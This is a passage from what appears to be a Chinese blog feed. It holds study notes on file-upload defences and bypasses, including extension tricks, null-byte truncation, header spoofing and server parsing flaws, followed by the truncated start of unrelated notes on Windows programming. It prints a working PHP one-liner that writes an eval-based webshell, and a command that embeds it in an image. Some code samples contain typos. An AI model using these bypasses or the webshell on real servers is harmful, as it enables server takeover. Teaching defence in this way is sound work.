<p>对于文件上传在服务器端文件重命名（重命名<strong>文件名和文件后缀</strong>）时，能够针对后缀名的各种绕过。通常会使用一个随机数生成函数来生成文件名，可以防止<code>%00</code>截断和解析漏洞。由于该方法适用场景单一，目前基本上无有效手段进行绕过。</p>
<p>文件重命名防护代码示例：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$filerename</span> =<span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line"><span class="variable">$newfile</span> = md5 (uniqid (microtime(<span class="number">7</span>)).<span class="string">&#x27;_&#x27;</span>.<span class="variable">$flerename</span>;</span><br><span class="line"><span class="keyword">if</span>(move_uploaded_fle(<span class="variable">$_</span> FILES[<span class="string">&#x27;upfile&#x27;</span>]l<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$distination</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$newfile</span>))</span><br><span class="line">......</span><br></pre></td></tr></table></figure>



<p><strong>绕过思路</strong>：黑白名单机制归根结底为限制用户的上传文件后缀名，避免可解析成 Web 的后缀名出现。可尝试使用未被过滤的文件后缀、解析漏洞等构造非限制条件进行绕过。</p>
<p><strong>绕过方法</strong>：</p>
<div class="note info"><p>针对黑名单：</p>
<ol>
<li><p>多重测试过过滤文件名</p>
<p>如针对<code>.php</code>的文件禁止上传，但没有对其他格式做出限制，可构造<code>php4</code>、<code>php5</code>、<code>cer</code>等后缀，同时中间件仍旧按照<code>.php</code>等进行解析。</p>
</li>
<li><p>后缀名大小写绕过</p>
</li>
<li><p>后缀名包含绕过</p>
<p>假如禁用<code>.php</code>后缀名，可构造<code>.pphphp</code>进行绕过。</p>
</li>
<li><p>特殊文件名构造（Windows 下）</p>
<p>由于黑名单方式是先对文件后缀进行校验，然后再将临时文件转存到真实路径下。该绕过方式是在文件后缀名验证通过后，在临时文件转存之前进行绕过。</p>
<p>代理抓上传的包将文件后缀名构造为<code>.php.</code>或<code>.php_</code>，文件上传到服务器后首先进行黑名单后缀名验证，验证通过后进行文件转存时，由于 Windows不识别这些后缀名，回自动去掉<code>.</code>和<code>_</code>等特殊符号，从而绕过黑名单防护。</p>
</li>
<li><p><code>%00</code>截断</p>
<p>此绕过方式利用的是 C 语言的<mark class="label warning">终止符</mark>特性，当 C 语言在执行过程中遇到<code>%00</code>，<code>%00</code>会被当成终止符，<strong>因此程序会自动截断后续信息</strong>，仅保留<code>%00</code>之前的内容。此漏洞仅存在于<code>PHP 5.3.7</code>之前的版本，如<code>shell.php .jp</code>g （注意，<code>jpg</code> 前有一个空格）。在上传页面进行转存时，之前文件名中的空格会被当成终止符，导致空格之后的内容被忽略。因此，最终文件名会变为<code>shell.php</code>，从而绕过了文件后缀名检查。</p>
</li>
</ol>
</div>

<div class="note success"><p>针对白名单：</p>
<p>相对于黑名单防护手段，白名单限制更为严格，非允许的后缀名一律拒绝上传，所以在黑名单中常用的修改大小写绕过手段、多类型后缀名绕过手段等，由于都无法满足白名单的过滤规则，因此都会被过滤。只有如下两种方式可以绕过防护机制：</p>
<ul>
<li>特殊文件名构造（参考黑名单防护）</li>
<li><code>0x00</code>截断（参考黑名单防护）</li>
</ul>
</div>

<h4 id="1-3-4-服务器端文件内容检测及绕过"><a href="#1-3-4-服务器端文件内容检测及绕过" class="headerlink" title="1.3.4 服务器端文件内容检测及绕过"></a>1.3.4 服务器端文件内容检测及绕过</h4><p><strong>防护思路</strong>：</p>
<div class="note primary"><p>针对图像文件，对文件内容的检测主要有以下三种方法。</p>
<ol>
<li>通过检测上传文件的<strong>文件头</strong>来判断当前文件格式。</li>
<li>调用 API 或函数对文件进行加载测试，常见的是图像二次渲染。</li>
<li>检测上传文件是否为图像文件内容。</li>
</ol>
</div>

<p>在上传漏洞的防护过程中，在文件上传时检测内容是一项非常有效的防护措施。防护手段可包含检测文件的文件头及内容图像格式是否合法（参考第一、三种防护方法），或者在显示过程中调用函数进行二次渲染，<mark class="label danger">导致木马等非图像代码由于无法渲染成像素而被丢弃</mark>，从而达到防护的效果（参考第二种防护方法）。但需注意的是，针对图像二次渲染会给服务器带来额外的性能开销。因此需要根据业务防护需求来寻找性能开销与安全要求之间的平衡点。</p>
<p><strong>防护代码</strong>：</p>
<p>（1）文件头判断</p>
<p>读取文件<strong>开头部分的数个字节</strong>，判断文件头与文件类型是否匹配。通常情况下，通过判断前<mark class="label success">10个字节</mark>基本上就能判断出一个文件的真实类型。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getTypeList</span>(<span class="params"> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  	<span class="keyword">return</span> <span class="keyword">array</span>(</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;FFD8FFE0&quot;</span>, <span class="string">&quot;jpg&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;89504E47&quot;</span>, <span class="string">&quot;png&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;47494638&quot;</span>，<span class="string">&quot;gif&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;49492A00&quot;</span>，<span class="string">&quot;tif&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;424D&quot;</span>, <span class="string">&quot;bmp&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;41433130&quot;</span>，<span class="string">&quot;dwg&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;38425053&quot;</span>, <span class="string">&quot;psd&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;7B5C727466&quot;</span>, <span class="string">&quot;rtf&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;3C3F786D6C&quot;</span>, <span class="string">&quot;xml&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;68746D6C3E&quot;</span>, <span class="string">&quot;html&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;44656C69766572792D646174&quot;</span>, <span class="string">&quot;eml&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span> (<span class="string">&quot;CFAD12FEC5FD746F&quot;</span>, <span class="string">&quot;dbx&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;2142444E&quot;</span>, <span class="string">&quot;pst&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;DOCF11E0&quot;</span>, <span class="string">&quot;xls/doc&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;5374616E64617264204A&quot;</span>, <span class="string">&quot;mdb&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;FF575043&quot;</span>, <span class="string">&quot;wpd&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;252150532041646F6265&quot;</span>, <span class="string">&quot;eps/ps&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;255044462D312E&quot;</span>, <span class="string">&quot;pdf&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;B3828596&quot;</span>, <span class="string">&quot;pwl&quot;</span>)</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;504B0304&quot;</span>, <span class="string">&quot;zip&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;52617221&quot;</span>, <span class="string">&quot;rar&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;57415645&quot;</span>, <span class="string">&quot;wav&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;41564920&quot;</span>, <span class="string">&quot;avi&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;2E7261FD&quot;</span>, <span class="string">&quot;ram&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;2B524D46&quot;</span>, <span class="string">&quot;rm&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;000001BA&quot;</span>, <span class="string">&quot;mpg&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;000001B3&quot;</span>, <span class="string">&quot;mpg&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;6D6F6F76&quot;</span>, <span class="string">&quot;mov&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;3026B2758E66CF11&quot;</span>, <span class="string">&quot;asf&quot;</span>),</span><br><span class="line">      <span class="keyword">array</span>(<span class="string">&quot;4D546864&quot;</span>, <span class="string">&quot;mid&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFileType</span>(<span class="params"><span class="variable">$fleName</span></span>)</span>&#123;</span><br><span class="line"><span class="variable">$file</span> = @fopen( <span class="variable">$fleName</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line"><span class="variable">$bin</span> = fread(<span class="variable">$fle</span>, <span class="number">5</span>);  <span class="comment">//只读5个字节</span></span><br><span class="line">fclose(<span class="variable">$file</span>);</span><br><span class="line"><span class="variable">$typelist</span>=getTypeList();</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$typelist</span> <span class="keyword">as</span> <span class="variable">$v</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="variable">$blen</span>=strlen(pack(<span class="string">&quot;H*&quot;</span>,<span class="variable">$v</span>[<span class="number">0</span>])); <span class="comment">// 得到文件头标记字节数</span></span><br><span class="line">  	<span class="variable">$tbin</span>=substr(<span class="variable">$bin</span>,<span class="number">0</span>,intval(<span class="variable">$blen</span>));<span class="comment">//需要比较文件头长度</span></span><br><span class="line">		<span class="keyword">if</span>(strtolower(<span class="variable">$v</span>[<span class="number">0</span>])==strtolower(array_shift(unpack(<span class="string">&quot;H*&quot;</span>,<span class="variable">$tbin</span>))))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable">$v</span>[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$upfile</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;upfile&quot;</span>];</span><br><span class="line"><span class="variable">$name</span>=<span class="variable">$upfile</span>[<span class="string">&quot;name&quot;</span>];</span><br><span class="line"><span class="variable">$type</span>=<span class="variable">$upfile</span>[<span class="string">&quot;type&quot;</span>];</span><br><span class="line"><span class="variable">$size</span>=<span class="variable">$upfile</span>[<span class="string">&quot;size&quot;</span>];</span><br><span class="line"><span class="variable">$tmp_name</span>=<span class="variable">$upfile</span>[<span class="string">&quot;tmp_ name&quot;</span>];</span><br><span class="line">	<span class="variable">$distination</span> = <span class="string">&#x27;/var/www/html/up1oad_04/fle/&#x27;</span>.<span class="variable">$name</span>;</span><br><span class="line">	<span class="keyword">echo</span> checkFileType(<span class="variable">$upfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">move_uploaded_file(<span class="variable">$upfile</span>[<span class="string">&#x27;tmp_name&#x27;</span>],<span class="variable">$distination</span>);</span><br></pre></td></tr></table></figure>

<p>（2）文件加载检测中的图像二次渲染</p>
<p>（3）图像内容检测</p>
<p><strong>绕过方法</strong>：</p>
<div class="note warning"><ol>
<li><p>文件头检测</p>
<p>修改文件头，对前<code>20</code>字节进行替换，后面再插人一句话木马，即可实现对文件内容检测的绕过。使用时先在要上传的文件的所有内容前添加<code>GIF89a</code>，Web 系统可判断当前文件为gif类型。需要注意的是，在实际中仅使用这种方法很多时候不能成功，因为上传功能还检测了后缀名<code>MIME</code>等。因此若仅仅是针对文件内容检测，可采用这种方法进行尝试。</p>
</li>
<li><p>文件二次渲染（极难）</p>
</li>
</ol>
<p>   1）基于数据二义性，即让数据既是图像数据也包含一句话木马。</p>
<p>   2）对文件加载器进行溢出攻击。</p>
<p>这里需要注意的是，如果仅仅对<code>.php</code>文件添加上述文件头，并不一定会控制<code>MIME</code>的生成值。因为在不同浏览器下，针对文件生成<code>MIME</code>时会有不同的情况。<code>IE</code>浏览器默认会根据文件头确定<code>MIME</code>值。但是<code>Chrome</code>、<code>Firefox </code>则仍以后缀名方式进行判断。</p>
</div>

<h4 id="1-3-5-上传流程安全防护总结"><a href="#1-3-5-上传流程安全防护总结" class="headerlink" title="1.3.5 上传流程安全防护总结"></a>1.3.5 上传流程安全防护总结</h4><p>攻击者利用上传功能实现的主要目标是：</p>
<ul>
<li>上传木马</li>
<li>让木马按照Web格式进行解析</li>
</ul>
<p>因此，在防护手段上，系统设计者在设计之初，考虑到系统性能问题，无法对每个上传的内容进行检查。这是因为多数上传的文件内容过于庞大，如果贸然对文件内容进行完全检查，则要消耗大量的系统资源，同时对系统速度造成极大影响，导致用户体验下降。因此有效的防护手段就是避免木马按照既定格式进行上传。可用的思路有：</p>
<p>（1）限制高危扩展名上传</p>
<ul>
<li>利用黑白名单确定后缀名是否合法。</li>
<li>根据应用特点重新对上传文件进行后缀重命名。</li>
</ul>
<p>（2）限制高危文件内容出现</p>
<ul>
<li>利用内容检索来检测是否存在非正常内容。</li>
<li>确认图片格式与上传文件内容是否对应。</li>
<li>在图像加载时重新渲染，避免非图像内容出现。</li>
</ul>
<p>不同于<code>XSS</code>攻击与<code>SQL</code>注入攻击，在上传过程中，在每个步骤上均可开展防护，根本目标是避免木马在服务器端执行，这也就是上传攻击的防护初衷。</p>
<h3 id="1-4-文件解析漏洞"><a href="#1-4-文件解析漏洞" class="headerlink" title="1.4 文件解析漏洞"></a>1.4 文件解析漏洞</h3><p>解析漏洞可以说是 Web 安全中比较“古老”的漏洞类型，绝大多数解析漏洞都是由于中间件的版本过低造成的。由于中间件在判断文件类型时，存在判断机制的问题，导致在实际解析过程中并不会按照既定的后缀名进行解析。攻击者针对这种情况，在文件名构造上进行特殊设计，导致中间件在判断此类特殊文件名时触发解析漏洞，实际解析后的文件 与文件名并不相同（<code>.jpg</code>文件会被当作<code>.php</code>文件执行）。解析漏洞的危害在于 Web 应用防护方面防护看似非常到位，但仍存在安全隐患。目前主流中间件在老版本中均在解析漏洞。以下为常见的存在解析漏洞的中间件及对应特性。</p>
<p>低版本的中间件存在解析漏洞。 下图是上传安全防护流程图。　</p>
<p><img data-src="https://i.loli.net/2020/12/21/2aWJsHwnoZUCrhT.png" alt="上传安全防护流程图"></p>
<h4 id="1-4-1-htaccess-攻击"><a href="#1-4-1-htaccess-攻击" class="headerlink" title="1.4.1 .htaccess 攻击"></a>1.4.1 .htaccess 攻击</h4><p>Apache 中允许多站点同时解析，关于Apache 的虚拟主机、虚拟目录、多站点：</p>
<p><strong>多站点</strong>：访问主机服务的本质访问 Web 服务，本质上看（从协议上）是访问某个 IP 的主机上的某个端口（默认是80），通常需要通过访问不同的域名或者端口，实现对不同网站的访问(具体到服务器里就是不同目录)，这个时候就需要设置网站空间。通常分为3种：<strong>基于域名、基于端口、基于IP以及它们的混合</strong>。</p>
<p>Apache 的虚拟主机就是在一台服务器上运行多个网站，每个虚拟主机都可以绑定独立的域名，为这些域名可以指定单独的目录，访问这些域名的时候，Apache 会打开对应目录里面的东西。实际是<mark class="label warning">依靠域名访问不同的目录文件</mark>。</p>
<p><strong>目录别名（虚拟目录</strong>）： 某个站点<code>www.abc.com</code>所对应文件夹下有一个目录为<code>d1</code>，则可以这样访问该目录： <code>www.abc.com/d1</code> 这个<code>d1</code>就称为“<strong>真实目录</strong>”； 虚拟目录就是： 该站点下不存在某目录名，但却可以使用同样的语法形式，去访问，比如：<code> www.abc.com/d2</code>  ，假设该站点目录下根本就没有<code>d2</code>这个目录，此时却可以访问实现这种技术，就是所谓“目录别名”（<strong>虚拟目录</strong>）</p>
<p><a href="http://httpd.apache.org/docs/2.4/zh-cn/vhosts/">Apache 虚拟主机文档</a>、<a href="https://blog.csdn.net/the_victory/article/details/51006167?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-2.control">Apache2.4虚拟主机和多站点配置</a>、<a href="https://blog.csdn.net/qq_37730771/article/details/79729931">单站点和多站点和虚拟目录</a>、<a href="https://www.cnblogs.com/hzk001/p/11748204.html">Apache的虚拟主机功能</a></p>
<div class="note danger"><p><strong>虚拟主机</strong>：Apache的虚拟主机功能 (Virtual Host) 是可以让一台服务器基于IP、主机名或端口号实现提供多个网站服务的技术。简单来说，Apache 虚拟主机就是在一个 Apache 服务器上配置多个虚拟空间，实现一个服务器提供多站点服务，其实就是访问同一个服务器上的不同目录。每个目录对应一个站点。</p>
</div>

<p><code>.htaccess</code>文件是 Apache 服务器中最常用的一个配置文件，它负责相关目录下的网页配置。通过 <code>.htaccess</code>文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许&#x2F;阻止特定的用户或者目录的访问、禁止目录列表、配置索引入口等功能。</p>
<p>在早期以黑白名单为主流防护技术的时期，攻击者经常在获得当前系统的 Webshell 之后，会修改<code>.htaccess</code>文件内容，添加未知后缀以<code>.php</code>的方式执行（任意后缀的文件都会被当作 php 文件执行）。这样就算当前的 Webshell 丢失，也可在下次攻击时直接利用未知文件名重新快速获得 Webshell，这也算另一种“后门”的效果。</p>
<p>虽然用户端做了大量的防护功能，但是可利用虚拟目录功能，实现中间件层的解析欺骗，导致木马可以非正常后缀名进行执行。不过，实际过程中可利用的场景非常少，主要是由于<mark class="label info">.htaccess 文件需放在当前 Web 目录下面</mark>。攻击者如果能在当前Web目录下插人任意的文件，其实攻击者已经获得当前系统的webshell，也就没有必要利用这种方式进行攻击。</p>
<p>【<a href="https://blog.csdn.net/jamin25521/article/details/7883019">htaccess功能</a>】</p>
<h4 id="1-4-2-Apache-解析漏洞攻击"><a href="#1-4-2-Apache-解析漏洞攻击" class="headerlink" title="1.4.2 Apache 解析漏洞攻击"></a>1.4.2 Apache 解析漏洞攻击</h4><p>Apache中间件早期版本在后缀解析<code>test.php.x1.x2.x3</code>时，Apache 将<mark class="label primary">从右至左</mark>开始判断后缀，若<code>x3</code>为非可识别后缀，再判断<code>x2</code>，直到找到可识别后缀为止，然后将该可识别后缀进解析。例如，<code>test.php.x1.x2.x3</code>会被解析为<code>php</code>。</p>
<p>解析漏洞的危害在于对以上的文件上传防护机制都可以进行绕过。当然，存在解析漏洞的中间件的版本都比较老，新版本不存在上述问题。因此要解决解析漏洞的问题，简单有效的方法就是升级中间件版本。</p>
<p>另外有一点需要注意， 很多人会使用集成环境来部署 Web 服务器。集成环境部署简易、使用方便，因此应用广泛。但需要注意的是，集成环境的软件版本并不是中间件的版本。因此从安全角度考虑，需要严格检查集成环境中的 Apache及 PHP 版本，避免出现解析漏洞或截断漏洞等。下面是些存在解析漏洞的集成环境版本及中间件对应版本信息，用以核对当前服务器安全状态或进行漏洞测试：</p>
<ul>
<li>WampServer2.0 All Version (WampServer2.0i &#x2F; Apache 2.2.11)</li>
<li>WampServer2. 1 All Version (WampServer2. le-x32 &#x2F; Apache 2.2.17)</li>
<li>Wamp5 All Version (Wamp5_ 1.7.4 &#x2F; Apache 2.2.6)</li>
<li>AppServ 2.4 All Version (AppServ - 2.4.9 &#x2F; Apache 2.0.59)</li>
<li>AppServ 2.5 All Version (AppServ - 2.5.10 &#x2F; Apache 2.2.8)</li>
<li>AppServ 2.6 AlI Version (AppServ - 2.6.0 &#x2F; Apache 2.2.8)</li>
</ul>
<h4 id="1-4-3-IIS-解析漏洞攻击"><a href="#1-4-3-IIS-解析漏洞攻击" class="headerlink" title="1.4.3 IIS 解析漏洞攻击"></a>1.4.3 IIS 解析漏洞攻击</h4><div class="note default"><p><strong>（1） IIS 6.0</strong></p>
<p>随着 Windows Server 2003 的停止维护，IIS 6.0 的利用范围也在大幅度缩小。目前，新版的 IIS 中已不存在解析漏洞。这里仅以6.0环境作为漏洞利用场景来分析解析漏洞的综合利用方式。在解析<code>asp</code>格式的时候有两个解析漏洞：</p>
<p>1）如果<mark class="label danger">目录</mark>名包含<code>.asp</code>字符串，那么这个目录下所有的文件都会按照<code>asp</code>格式解析。例如，对于<code>/xx.asp/xx.jpg</code> （ <code>xx.jpg</code>可替换为任意文本文件），IIS 6.0 会将<code>xx.jpg</code>解析为<code>asp</code>文件。</p>
<p>2）只要文件名中含有<code> .asp;</code>，就会优先按<code>asp</code>来解析。例如，对于<code>/xx.asp;jpg</code> （此处需抓包修改文件名），IIS 6.0 都会把此类后缀文件成功解析为<code>asp</code>文件。（<code>/xx.asp:.jpg</code>这 类文件在Windows下不允许存在，<code>:.jpg </code>被自动除去，剩下<code>/xx.asp</code>。）    </p>
<p>HIS 6.0 默认的可执行文件除了<code>asp</code>还包含如下三种：<code> /xx.asa</code>、<code> /xx.cer</code>、<code>/xx.cdx</code>。（在 IIS默认配置中，这几个后缀默认由<code>asp.dll</code>来解析，所以执行权限和<code>.asp</code>一模一样，可在配置中自行删除该后缀，以免出现安全隐患。）</p>
</div>

<div class="note primary"><p><strong>（2）IIS 7.0&#x2F;IIS 7.5</strong></p>
<p>IIS 7.0&#x2F;7.5 存在的解析漏洞利用场景比 IIS 6.0要苛刻，主要是在对<code>php</code>解析时存在类似于 Nginx 的解析漏洞，并且需要处于<code>Fast-CGI</code>开启状态。在漏洞利用方式上，只要在任意文件名的 URL 后追加字符串<code>/任意文件名.php</code>，那么当前文件就会按照<code>php</code>的方式解析。</p>
<p>利用方法如下：将一张图和一个写人后门代码的文本文件合并， 将恶意文本写人图片的二进制代码之后，避免破坏图片文件头和尾。Windows 下可利用 CMD 命令实现文件拼接:：<code>copy xx.jpg/b + yy.txt/a xy.jpg</code></p>
<p>其中，参数的意义为：</p>
<ul>
<li><code>/b</code>  二进制（binary）模式。</li>
<li><code>/a</code>   ASCII 模式<code>xx.jpg</code>正常图片文件。</li>
<li><code>yy.txt</code>的内容如下：</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?PHP</span> fputs(fopen(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php eval($_POST[cmd])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这段代码的作用是写人一个内容为<code>&lt;?php eval($_POST[cmd])?&gt; </code>、名称为<code>shell.php</code>的文件。利用图片合成工具，也可达到上述效果。</p>
<p>执行成功后的效果就是在上传文件的真实目录下生成一句话木马文件<code>shel.php</code>，再利用各类连接工具连接即可完成整体漏洞利用。需要注意的是，<strong>IIS7.0&#x2F;7.5 下的解析漏洞是由于<code>php-cgi</code>本身的问题导致，与 IIS 自身并没有直接关系</strong>。</p>
</div>

<h4 id="1-4-4-Nginx-解析漏洞攻击"><a href="#1-4-4-Nginx-解析漏洞攻击" class="headerlink" title="1.4.4 Nginx 解析漏洞攻击"></a>1.4.4 Nginx 解析漏洞攻击</h4><p>目前 Nginx 的解析漏洞利用方式与 Apache、IIS基本一致。一个是对于任意文件名，在后面添加<code>/任意文件名.php</code>的解析漏洞，比如原本文件名是<code>test.jpg</code>，可以添加为<code>test.jpg/x.php</code>进行解析攻击。还有一种是针对低版本的 Nginx，可以在任意文件名后面添加<code>%00.php</code>进行解析攻击。</p>
<p>下面几个版本都存在此问题：</p>
<ul>
<li>Nginx 0.5.*</li>
<li>Nginx 0.6.*</li>
<li>Nginx 0.7 &lt;&#x3D; 0.7.65</li>
<li>Nginx 0.8 &lt;&#x3D; 0.8.37</li>
</ul>
<p><code>任意文件名/任意文件名.php</code>这个漏洞其实是出现自<code>php-cgi</code>的漏洞，与 Nginx 自身无关，这点与 IIS 7.0&#x2F;7.5 与 PHP 配合使用时解析漏洞产生原理一样。</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>知识笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows核心编程（第五版）_1_错误处理_字符处理_内核对象</title>
    <url>/post/windows-core-programming/</url>
    <content><![CDATA[<p>ʕ •ᴥ•ʔ  ɔ: </p>
<span id="more"></span>

<p><img data-src="https://img.shields.io/badge/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0-%E3%80%8AWindows%E6%A0%B8%E5%BF%83%E7%BC%96%E7%A8%8B%EF%BC%88%E7%AC%AC%E4%BA%94%E7%89%88%EF%BC%89%E3%80%8B-1fd0f6.svg?colorA=ff69b4"></p>
<h2 id="1-Windows-API返回值"><a href="#1-Windows-API返回值" class="headerlink" title="1 Windows API返回值"></a>1 Windows API返回值</h2><p>调用Windows函数时，它会先验证我们传给它的参数，然后再开始执行任务。如果传入的参数无效，或者由于其他原因导致操作无法执行，则函数的返回值将指出函数因为某些原因失败了。表1-1展示了大多数Windows函数使用的返回值的数据类型。</p>
<p><img data-src="https://i.loli.net/2021/11/04/5kmzEPThDyJ43bO.png" alt="1.png"></p>
<h3 id="1-1-函数的错误码"><a href="#1-1-函数的错误码" class="headerlink" title="1.1 函数的错误码"></a>1.1 函数的错误码</h3><p>通常情况下，如果 Windows函数能返回错误代码，将有助于我们理解函数调用为什么会失败。 Microsoft编辑了一个列表，其中列出了所有可能的错误代码，<mark class="label success">并为每个错误代码都分配了一个32位的编号</mark>。定义于<mark class="label danger">WinError.h</mark>头文件中。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">DWORD <span class="title">GetlastError</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p>此函数的作用很简单，就是返回由上一个函数调用设置的线程的32位错误代码。</p>
<p>在这个头文件中每个错误码（消息ID）都对应：一个消息ID（一个可在源代码中使用的宏，用于与<code>GetLastError</code>的返回值进行比较）、消息文本（描述错误的英文文本）和一个编号（应该避免使用此编号，尽量使用消息ID）。</p>
<div class="note primary"><p><strong>注意：</strong>Windows函数失败之后，应该马上调用<code>GetLastError</code>，因为假如又调用了另一个Windows函数，则此值很可能被改写。注意，成功调用的Windows函数可能用<code>ERROR_SUCCESS</code>改写此值。</p>
<p><mark class="label default">不管成功与否，使用<code>GetLastError</code>都可以知道函数调用的额外信息。</mark></p>
</div>

<h3 id="1-2-自定义错误码"><a href="#1-2-自定义错误码" class="headerlink" title="1.2 自定义错误码"></a>1.2 自定义错误码</h3><p>为了指出错误，只需<mark class="label warning">设置线程的上一个错误代码</mark>，然后令自己的函数返回<code>FALSE</code>，<code>INVALID_HANDLE_VALUE</code>、<code>NULL</code>或者其他合适的值。为了设置线程的上一个错误代码，只需调用以下函数，并传递我们认为合适的任何32位值：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">SetlastError</span><span class="params">(DWORD dwErrCode)</span></span>;</span><br></pre></td></tr></table></figure>

<p>该32位值的每一位含义如下：</p>
<p><img data-src="https://i.loli.net/2021/11/04/PMXndw8cJgW5673.png" alt="2.png"></p>
<p>Microsoft承诺，<strong>在它所生成的所有错误代码中，第29位将始终为0</strong>。但是，如果要创建我们自己的错误代码，就必须在此位放入一个1。通过这种方式，可以保证我们的错误代码绝不会与Microsoft现在和将来定义的错误代码冲突。注意，Facility字段非常大，足以容纳4096个可能的值。其中，前256个值是为Microsoft保留的，其余的值可由我们自己的应用程序来定义。</p>
<h2 id="2-字符和字符串处理"><a href="#2-字符和字符串处理" class="headerlink" title="2 字符和字符串处理"></a>2 字符和字符串处理</h2><h3 id="2-1-字符集"><a href="#2-1-字符集" class="headerlink" title="2.1 字符集"></a>2.1 字符集</h3><table>
<thead>
<tr>
<th>字符集</th>
<th>字节数</th>
<th>表示范围</th>
<th>注释</th>
</tr>
</thead>
<tbody><tr>
<td>标准ASCII</td>
<td><strong>1字节</strong>，使用低7位，最高位始终为0.</td>
<td>0～127</td>
<td>标准 ASCII 码使用 7 位二进制数来表示所有的大写和小写字母，数字 0 到 9、标点符号，以及在美式英语中使用的特殊控制字符。</td>
</tr>
<tr>
<td>扩展 ASCII 码（ANSI）</td>
<td><strong>1字节</strong>，使用8位，最高位为0时相当于标准ASCII.</td>
<td>0～255</td>
<td>扩展 ASCII 码允许将每个字符的第 8 位用于确定附加的 128 个特殊符号字符、外来语字母和图形符号。<br />ASCll码的字符集可以扩充了128个字符，即十进制数128～255，称为扩展ASCII码。扩展ASCII码所增加的字符包括加框文字、圆圈和其他图形符号。</td>
</tr>
<tr>
<td>GB2312</td>
<td><strong>2字节</strong>，高9位为0时，低7位含义同标准ASCII.</td>
<td>0～65535</td>
<td>一个小于127的字符的意义与原来相同，  但两个大于127的字符连在一起时，就表示一个汉字。不同的文字（国家语言）存于不同的序段。<br />虽然是双字节编码，但是编码完全不同于Unicode。</td>
</tr>
<tr>
<td>GBK</td>
<td><strong>2字节</strong>，属于扩展的GB2312.</td>
<td>0～65535</td>
<td>GB2312是简体汉字编码规范，GBK编码能够用来同时表示繁体字和简体字，而GB2312只能表示简体字，GBK是兼容GB2312编码的。</td>
</tr>
<tr>
<td>Unicode</td>
<td><strong>1～4字节</strong>，Windows使用UTF-16编码形式存储字符.</td>
<td>0x000000~0x0010FFFF</td>
